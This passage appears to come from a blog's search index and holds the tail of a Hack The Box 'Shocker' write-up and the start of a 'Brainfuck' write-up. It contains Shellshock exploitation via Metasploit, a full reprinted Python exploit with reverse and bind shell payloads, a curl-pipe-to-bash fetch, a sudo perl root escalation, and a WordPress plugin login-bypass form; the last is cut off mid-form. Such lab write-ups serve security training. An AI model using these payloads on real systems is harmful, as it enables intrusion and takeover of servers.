OS:NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Uptime guess: 194.940 days (since Tue Jul 27 00:59:10 2021) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=264 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds Raw packets sent: 1110 (52.890KB) | Rcvd: 1071 (46.310KB)   Directory Enum 1 2 3 4 5  dirb http://10.10.10.56 -\u0026gt; + http:/as/10.10.10.56/cgi-bin/ (CODE:403|SIZE:294) + http://10.10.10.56/index.html (CODE:200|SIZE:137) + http://10.10.10.56/server-status (CODE:403|SIZE:299)   search for package in Ubuntu → https://packages.ubuntu.com/\n Dirb in the Forbidden directory → http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294) This time looking for .sh and .pl files  1  dirb http://10.10.10.56/cgi-bin -X .sh,.pl   1  http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:118)    Based on the name of the machine it is a shellshock machine and also because it has cgi-bin with script file  1 2 3 4 5 6 7  locate nse | grep shellshock -\u0026gt; /usr/share/nmap/scripts/http-shellshock.nse less /usr/share/nmap/scripts/http-shellshock.nse -\u0026gt; -- @usage -- nmap -sV -p- --script http-shellshock \u0026lt;target\u0026gt; -- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls \u0026lt;target\u0026gt;    Add /user.sh instead of /bin  1  nmap -sV -p- -vv --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83  Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 11:34 EST NSE: Loaded 46 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 2) scan. Initiating NSE at 11:34 Completed NSE at 11:34, 0.00s elapsed NSE: Starting runlevel 2 (of 2) scan. Initiating NSE at 11:34 Completed NSE at 11:34, 0.00s elapsed Initiating Ping Scan at 11:34 Scanning 10.10.10.56 [4 ports] Completed Ping Scan at 11:34, 0.02s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 11:34 Completed Parallel DNS resolution of 1 host. at 11:34, 0.01s elapsed Initiating SYN Stealth Scan at 11:34 Scanning 10.10.10.56 [65535 ports] Discovered open port 80/tcp on 10.10.10.56 Discovered open port 2222/tcp on 10.10.10.56 Completed SYN Stealth Scan at 11:35, 15.20s elapsed (65535 total ports) Initiating Service scan at 11:35 Scanning 2 services on 10.10.10.56 Completed Service scan at 11:35, 6.04s elapsed (2 services on 1 host) NSE: Script scanning 10.10.10.56. NSE: Starting runlevel 1 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.24s elapsed NSE: Starting runlevel 2 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.06s elapsed Nmap scan report for 10.10.10.56 Host is up, received echo-reply ttl 63 (0.021s latency). Scanned at 2022-02-07 11:34:57 EST for 22s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-shellshock: | VULNERABLE: | HTTP Shellshock vulnerability | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2014-6271 | This web application might be affected by the vulnerability known | as Shellshock. It seems the server is executing commands injected | via malicious HTTP headers. | | Disclosure date: 2014-09-24 | Exploit results: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; | \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The server encountered an internal error or | misconfiguration and was unable to complete | your request.\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Please contact the server administrator at | webmaster@localhost to inform them of the time this error occurred, | and the actions you performed just before this error.\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;More information about this error may be available | in the server error log.\u0026lt;/p\u0026gt; | \u0026lt;hr\u0026gt; | \u0026lt;address\u0026gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80\u0026lt;/address\u0026gt; | \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | | References: | http://www.openwall.com/lists/oss-security/2014/09/24/10 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169 | http://seclists.org/oss-sec/2014/q3/685 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.00s elapsed NSE: Starting runlevel 2 (of 2) scan. Initiating NSE at 11:35 Completed NSE at 11:35, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds Raw packets sent: 65711 (2.891MB) | Rcvd: 65536 (2.621MB)   Exploitation with meterpreter CVE-2014-6271 1 2 3 4 5 6 7 8 9 10 11  msfconsole search CVE-2014-6271 -\u0026gt; exploit/multi/http/apache_mod_cgi_bash_env_exec use exploit/multi/http/apache_mod_cgi_bash_env_exec # This module corresponds to the CVE-2014-6271 set rhosts 10.10.10.56 set targeturi /cgi-bin/user.sh set lhost 10.10.14.35 run   1 2 3 4 5 6 7 8 9  meterpreter\u0026gt; which python meterpreter\u0026gt; which python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Spawn a stable shell cd home cd shelly cat user.txt -\u0026gt; ********************************   Using LinEnum.sh to enumerate the machine. → LinEnum\n1 2 3  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh python -m SimpleHTTPServer    In the compromised machine  1  curl 10.10.14.35:8000/LinEnum.sh | bash   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  [+] We can sudo without supplying a password! Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl [+] Possible sudo pwnage! /usr/bin/perl ----------------------------------------------- # Also sudo -l -\u0026gt; (root) NOPASSWD: /usr/bin/perl   Privilege Escalation Source:https://gtfobins.github.io/gtfobins/perl/\n1 2 3 4 5 6 7 8 9 10  sudo perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; whoami -\u0026gt; root python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; cd root cat root.txt -\u0026gt; ********************************   Manual Exploitation Google apache2 cgi-bin exploit\n https://www.exploit-db.com/exploits/34900 Using this python code to exploit shellshock  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146  #!/usr/bin/env python from socket import * from threading import Thread import thread, time, httplib, urllib, sys stop = False proxyhost = \u0026#34;\u0026#34; proxyport = 0 def usage(): print \u0026#34;\u0026#34;\u0026#34; Shellshock apache mod_cgi remote exploit Usage: ./exploit.py var=\u0026lt;value\u0026gt; Vars: rhost: victim host rport: victim port for TCP shell binding lhost: attacker host for TCP shell reversing lport: attacker port for TCP shell reversing pages: specific cgi vulnerable pages (separated by comma) proxy: host:port proxy Payloads: \u0026#34;reverse\u0026#34; (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport) \u0026#34;bind\u0026#34; (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport) Example: ./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234 ./exploit.py payload=bind rhost=1.2.3.4 rport=1234 Credits: Federico Galatolo 2014 \u0026#34;\u0026#34;\u0026#34; sys.exit(0) def exploit(lhost,lport,rhost,rport,payload,pages): headers = {\u0026#34;Cookie\u0026#34;: payload, \u0026#34;Referer\u0026#34;: payload} for page in pages: if stop: return print \u0026#34;[-] Trying exploit on : \u0026#34;+page if proxyhost != \u0026#34;\u0026#34;: c = httplib.HTTPConnection(proxyhost,proxyport) c.request(\u0026#34;GET\u0026#34;,\u0026#34;http://\u0026#34;+rhost+page,headers=headers) res = c.getresponse() else: c = httplib.HTTPConnection(rhost) c.request(\u0026#34;GET\u0026#34;,page,headers=headers) res = c.getresponse() if res.status == 404: print \u0026#34;[*] 404 on : \u0026#34;+page time.sleep(1) args = {} for arg in sys.argv[1:]: ar = arg.split(\u0026#34;=\u0026#34;) args[ar[0]] = ar[1] try: args[\u0026#39;payload\u0026#39;] except: usage() if args[\u0026#39;payload\u0026#39;] == \u0026#39;reverse\u0026#39;: try: lhost = args[\u0026#39;lhost\u0026#39;] lport = int(args[\u0026#39;lport\u0026#39;]) rhost = args[\u0026#39;rhost\u0026#39;] payload = \u0026#34;() { :;}; /bin/bash -c /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026#34;+lhost+\u0026#34;/\u0026#34;+str(lport)+\u0026#34; 0\u0026gt;\u0026amp;1 \u0026amp;\u0026#34; except: usage() elif args[\u0026#39;payload\u0026#39;] == \u0026#39;bind\u0026#39;: try: rhost = args[\u0026#39;rhost\u0026#39;] rport = args[\u0026#39;rport\u0026#39;] payload = \u0026#34;() { :;}; /bin/bash -c \u0026#39;nc -l -p \u0026#34;+rport+\u0026#34; -e /bin/bash \u0026amp;\u0026#39;\u0026#34; except: usage() else: print \u0026#34;[*] Unsupported payload\u0026#34; usage() try: pages = args[\u0026#39;pages\u0026#39;].split(\u0026#34;,\u0026#34;) except: pages = [\u0026#34;/cgi-sys/entropysearch.cgi\u0026#34;,\u0026#34;/cgi-sys/defaultwebpage.cgi\u0026#34;,\u0026#34;/cgi-mod/index.cgi\u0026#34;,\u0026#34;/cgi-bin/test.cgi\u0026#34;,\u0026#34;/cgi-bin-sdb/printenv\u0026#34;] try: proxyhost,proxyport = args[\u0026#39;proxy\u0026#39;].split(\u0026#34;:\u0026#34;) except: pass if args[\u0026#39;payload\u0026#39;] == \u0026#39;reverse\u0026#39;: serversocket = socket(AF_INET, SOCK_STREAM) buff = 1024 addr = (lhost, lport) serversocket.bind(addr) serversocket.listen(10) print \u0026#34;[!] Started reverse shell handler\u0026#34; thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,)) if args[\u0026#39;payload\u0026#39;] == \u0026#39;bind\u0026#39;: serversocket = socket(AF_INET, SOCK_STREAM) addr = (rhost,int(rport)) thread.start_new_thread(exploit,(\u0026#34;\u0026#34;,0,rhost,rport,payload,pages,)) buff = 1024 while True: if args[\u0026#39;payload\u0026#39;] == \u0026#39;reverse\u0026#39;: clientsocket, clientaddr = serversocket.accept() print \u0026#34;[!] Successfully exploited\u0026#34; print \u0026#34;[!] Incoming connection from \u0026#34;+clientaddr[0] stop = True clientsocket.settimeout(3) while True: reply = raw_input(clientaddr[0]+\u0026#34;\u0026gt; \u0026#34;) clientsocket.sendall(reply+\u0026#34;\\n\u0026#34;) try: data = clientsocket.recv(buff) print data except: pass if args[\u0026#39;payload\u0026#39;] == \u0026#39;bind\u0026#39;: try: serversocket = socket(AF_INET, SOCK_STREAM) time.sleep(1) serversocket.connect(addr) print \u0026#34;[!] Successfully exploited\u0026#34; print \u0026#34;[!] Connected to \u0026#34;+rhost stop = True serversocket.settimeout(3) while True: reply = raw_input(rhost+\u0026#34;\u0026gt; \u0026#34;) serversocket.sendall(reply+\u0026#34;\\n\u0026#34;) data = serversocket.recv(buff) print data except: pass   1 2 3 4 5  # nano [nanme of the file from above] # add \u0026#34;/cgi-bin/user.sh\u0026#34; to pages section # Run the python script python exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.35 lport=6666   Skills Learned  Exploiting shellshock Exploiting NOPASSWD  ","description":"Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers. ","id":21,"section":"posts","tags":["OSCP","linux","rce","cve","cgi","sudo","metasploit","apache"],"title":"Hackthebox - Shocker","uri":"https://hswootan.github.io/en/posts/shocker/"},{"content":"Reconnaissance \r1  nmap -sC -sV -O -vv 10.10.10.17 -oA brainfuck   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUvFkWE1DxJj4OsU4DiVLjkxYV2a9pSlMS/78hpx0IejJaFilgNb+RFCyfyhIw5NvsZB6hZiNL0vPDh+MscPd75heIIgx9mczfamsrA2KODdkdgUJPCBWUnF9/VhYQhJpGvo4f6lAwLz7wnmcjhiXencMNkZcweADi5aK0Xp6iFxYcwx6+qy0891gQ5TnVVazkDJNA+QMUamxJRm1tQN5dp/+TeBecWJH2AxQFXsM4wPkIFaE0GsKvYDmGyfy1YL/Gn5IxEqVrhIEYkDH4BQsbvORNueOtJKHoys7EhPF+STpx6ZAXS6AXhS/nJMz6EvubzeGqfBOaDIZN9u5JuCdf | 256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCJcOJZuuBlw9xDXy+VPpezMomPfySGOjABaxw02cmRifvzWE57mh1hlQD6z44IF1lsuW9E2NNH4xB4d8U0O5b0= | 256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOokdEAUqLEqEuY1CHNJ2xaDU+L+/0qb3XZO8UIZfrju 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 syn-ack ttl 63 Dovecot pop3d |_pop3-capabilities: TOP USER SASL(PLAIN) AUTH-RESP-CODE CAPA RESP-CODES PIPELINING UIDL 143/tcp open imap syn-ack ttl 63 Dovecot imapd |_imap-capabilities: OK post-login Pre-login AUTH=PLAINA0001 more ENABLE capabilities IMAP4rev1 have LITERAL+ listed SASL-IR ID LOGIN-REFERRALS IDLE 443/tcp open ssl/http syn-ack ttl 63 nginx 1.10.0 (Ubuntu) |_http-title: Welcome to nginx! | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.10.0 (Ubuntu) | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/localityName=Athens/organizationalUnitName=IT | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/localityName=Athens/organizationalUnitName=IT | Public Key type: rsa | Public Key bits: 3072 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-04-13T11:19:29 | Not valid after: 2027-04-11T11:19:29 | MD5: cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20 | SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66 | -----BEGIN CERTIFICATE----- | MIIFQzCCA6ugAwIBAgIJAI24F5h8eY+HMA0GCSqGSIb3DQEBCwUAMIGTMQswCQYD | VQQGEwJHUjEPMA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV | BAoMDkJyYWluZnVjayBMdGQuMQswCQYDVQQLDAJJVDEWMBQGA1UEAwwNYnJhaW5m | dWNrLmh0YjEkMCIGCSqGSIb3DQEJARYVb3Jlc3Rpc0BicmFpbmZ1Y2suaHRiMB4X | DTE3MDQxMzExMTkyOVoXDTI3MDQxMTExMTkyOVowgZMxCzAJBgNVBAYTAkdSMQ8w | DQYDVQQIDAZBdHRpY2ExDzANBgNVBAcMBkF0aGVuczEXMBUGA1UECgwOQnJhaW5m | dWNrIEx0ZC4xCzAJBgNVBAsMAklUMRYwFAYDVQQDDA1icmFpbmZ1Y2suaHRiMSQw | IgYJKoZIhvcNAQkBFhVvcmVzdGlzQGJyYWluZnVjay5odGIwggGiMA0GCSqGSIb3 | DQEBAQUAA4IBjwAwggGKAoIBgQCjBI0m6FWgcLYONyxVeMgc+PuTFJMnMUjMb8BF | t0PIDSCt10grCCfzBNDIqfU9byiokyYVvvD+sRoWJQfMjd3I3NXMxHwpcLM6X9oR | Twt1iBBJRQkTnHOs1hyCmkiM+kn2W1xdL+mwBylAUlvUReLIDdS5anE7u95ApWsD | TTUt/mMUl1DwnCqrNkt3czQzCNfCIwIhbaLjsoXsiVo1fFEr6UpsyiaXad9eTTsl | EF9k3rByXrmP1WrkaFLqGhqS4v+rYtsyKGPngjAB664aAvB2sSI0/EuOTa7WOPcV | NP3Tga+zx55qXPeo6nqCttOlAKKwiZqba5AgDAjSFdB6Q60dghWSuRYU999Ku6zA | DdwP0BoT5+kcZJENY7wx1uzysSMrtCoi8E6bfx42UwNQe/UCDDXErXat90hTB+vV | h2vaSdyR0tz3w1iIHBZH5/3rY3f+LyfE9fSg2TbGFgZNDq6O/iykVWb9SG+tl1fA | RB208Y1/mOw0+84G9RIjLVMLb0kCAwEAAaOBlzCBlDAdBgNVHQ4EFgQUj12KscJg | /6gSHzm+kzSN/psvik8wHwYDVR0jBBgwFoAUj12KscJg/6gSHzm+kzSN/psvik8w | DAYDVR0TBAUwAwEB/zALBgNVHQ8EBAMCBeAwNwYDVR0RBDAwLoIRd3d3LmJyYWlu | ZnVjay5odGKCGXN1cDNyczNjcjN0LmJyYWluZnVjay5odGIwDQYJKoZIhvcNAQEL | BQADggGBAJ11TuRhhSQfq5NHXU5fV5VkCOPUx3yKsWjt93Qm8WDD2rJcZAq8jW59 | NHDWhzDlKZMyNYv8gKJ8k6HuG3f20yeifKZulGw/YsY6dDtTzO+tooBqzjWb9irh | bpMIVXv1xBSuz+f5YGdzpvlMK/Ltt1nEQNjKXaTnjy7OGfp4isMZCzBZeKAKnjdn | +s6TgFrFA94B56naXNaNLHvv9WcFKviwDTP2PtDz0fc9hbnZz8oxE5Q6/l50NGUK | 6bGCVIjDJfM/SsWPLHb4J6chkJxlZZLmpid+s5PsKSdY0ZZ1Oxb20O2mla77hDSJ | d43t/sZRBwWPEWxAHUR8Dj5pcrbCFyi57Qu4ENc5w7H0RhRyd0/OWs6ahn2ef4Qy | DSWfdpd5CVBGdSLVlVSjzLcBDmWuyy8q5CTgJ3VzIzOreg93F2mVAF+tlNZRX9rc | dFjsS0lwXWRZqd6642VuAtf4HoAFBh9PfBtUx+t1DxCXyY7OTwnvMsnNFg9fw11v | krhc81zFeg== |_-----END CERTIFICATE-----   Exploitation  Going to → https://10.10.10.17/ and viewing the certificate information  1 2 3 4  # Adding those dns names into /etc/hosts nano /etc/hosts 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb    Accessing both → https://brainfuck.htb/ and https://sup3rs3cr3t.brainfuck.htb/  Wordpress scan 1  wpscan --url https://brainfuck.htb -e u,ap --disable-tls-checks   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110  __ _______ _____ \\ \\  / / __ \\ / ____| \\ \\  /\\  / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.20 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: https://brainfuck.htb/ [10.10.10.17] [+] Started: Sun Feb 6 17:40:35 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: nginx/1.10.0 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: https://brainfuck.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06). | Found By: Rss Generator (Passive Detection) | - https://brainfuck.htb/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.7.3\u0026lt;/generator\u0026gt; | - https://brainfuck.htb/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.7.3\u0026lt;/generator\u0026gt; [+] WordPress theme in use: proficient | Location: https://brainfuck.htb/wp-content/themes/proficient/ | Last Updated: 2022-02-01T00:00:00.000Z | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt | [!] The version is out of date, the latest version is 3.0.74 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3 | Style Name: Proficient | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof... | Author: Specia | Author URI: https://speciatheme.com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.0.6 (80% confidence) | Found By: Style (Passive Detection) | - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: \u0026#39;Version: 1.0.6\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-09-03T07:57:00.000Z | [!] The version is out of date, the latest version is 9.1.2 | | Found By: Urls In Homepage (Passive Detection) | | Version: 7.1.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;===============================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] administrator | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Feb 6 17:40:59 2022 [+] Requests Done: 25 [+] Cached Requests: 39 [+] Data Sent: 6.472 KB [+] Data Received: 60.767 KB [+] Memory used: 229.125 MB [+] Elapsed time: 00:00:24    Found 2 users admin and administrator Plugin vulnerable → [+] wp-support-plus-responsive-ticket-system (Version: 7.1.3 (100% confidence))  1 2 3 4  searchsploit wp support -\u0026gt; WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation | php/webapps/41006.txt -\u0026gt; WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection | php/webapps/40939.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  searchsploit -x 41006.txt ------------------------------------------------------------ # Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation # Date: 10-01-2017 # Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/ # Exploit Author: Kacper Szurek # Contact: http://twitter.com/KacperSzurek # Website: http://security.szurek.pl/ # Category: web 1. Description You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie(). http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html 2. Proof of Concept \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;http://wp/wp-admin/admin-ajax.php\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;administrator\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;sth\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;loginGuestFacebook\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Then you can go to admin panel. ------------------------------------------------------------   1 2 3 4 5 6 7 8 9 10 11 12 13  # Create a file called exploit.html # action=\u0026#34;https://brainfuck.htb/admin-ajax.php\u0026#34; # input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;admin\u0026#34; # name=\u0026#34;email\u0026#34; value=\u0026#34;orestis@brainfuck.htb\u0026#34; ---------------------------------------------------------------- \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;https://brainfuck.htb/wp-admin/admin-ajax.php\u0026#34;\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;admin\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;orestis@brainfuck.htb\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; 